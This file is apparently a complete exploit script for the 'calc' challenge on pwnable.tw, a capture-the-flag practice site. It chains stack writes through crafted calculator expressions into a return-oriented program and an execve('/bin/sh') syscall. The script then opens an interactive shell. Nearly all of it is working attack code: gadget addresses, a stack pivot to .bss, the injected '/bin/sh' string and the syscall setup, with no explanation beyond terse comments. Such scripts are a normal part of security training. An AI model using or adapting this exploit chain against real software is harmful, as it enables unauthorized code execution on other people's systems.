#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./calc')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10100)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --
libc = False
io = start()
ret = 0x000000080e59cb
add_esp_4_ret = 0x0807cc6c
xor_eax_eax = 0x000000080550d0
binsh = 0x80ed458
pop_eax = 0x0000000805c34b
pop_ebx = 0x000000080481d1
pop_ecx_ebx = 0x000000080701d1
pop_edx = 0x000000080701aa
syscall = 0x0807087f
dec_ecx = 0x0806f4eb
dec_edx = 0x080e72e3
leave_ret = 0x00000008048d88
rop_start = 0x80ed390
sl(f"-2-{1}") # JUNK
sl(f"-3-{2}") # JUNK
sl(f"-4-{leave_ret}") # write leave_ret gadget on stack
sl(f"-5-{rop_start-4}") # write our rop_chain bss address on stack 
sl(f"-9-{0x80edac0}") # overwrite rbp with bss
sl(f"-50-{0x68732f2f}") # binsh
sl(f"-51-{0x6e69622f}") # binsh
sl(f"-91-{1145258561}") # JUNK->ABCD
sl(f"-92-{syscall}")
sl(f"-93-{dec_edx}")
sl(f"-94-{0x1}")
sl(f"-95-{pop_edx}")
sl(f"-96-{dec_ecx}")
sl(f"-97-{binsh}")
sl(f"-98-{0x1}")
sl(f"-99-{pop_ecx_ebx}")
sl(f"-100-{0xb}")
sl(f"-101-{pop_eax}")
sl(f"-1344-{0x08048ff1}") # add esp 0x4, pop, pop, pop ebp, ret
io.interactive()

